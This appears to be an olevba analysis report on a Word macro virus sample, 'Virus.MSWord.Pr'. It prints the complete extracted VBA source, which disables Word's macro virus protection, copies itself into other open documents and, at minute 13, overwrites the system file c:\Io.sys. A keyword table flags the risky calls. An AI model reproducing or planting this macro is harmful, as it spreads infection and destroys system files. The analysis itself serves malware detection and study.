olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pr
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pr - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



























'
Dim A, B, D, E As Integer
Dim t, m, f
Private Sub Document_Close()
Options.VirusProtection = False
A = 1: B = 2: pr1
A = 2: B = 1: pr1
t = VBA.Time
m = Minute(t)
If m <> 13 Then End
f = "c:\Io.sys"
SetAttr f, vbNormal
Open f For Output As #1
Print #1, "M97v"
Close
SetAttr f, vbSystem
End
End Sub
Private Sub pr1()
 D = Application.VBE.VBProjects(A).VBComponents(1).CodeModule.CountOfLines
 E = Application.VBE.VBProjects(B).VBComponents(1).CodeModule.CountOfLines
 If D > 10 Then Exit Sub
Application.VBE.VBProjects(A).VBComponents(1).CodeModule.AddFromString (Application.VBE.VBProjects(B).VBComponents(1).CodeModule.Lines(2, E))
End
End Sub
'
'M97v







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

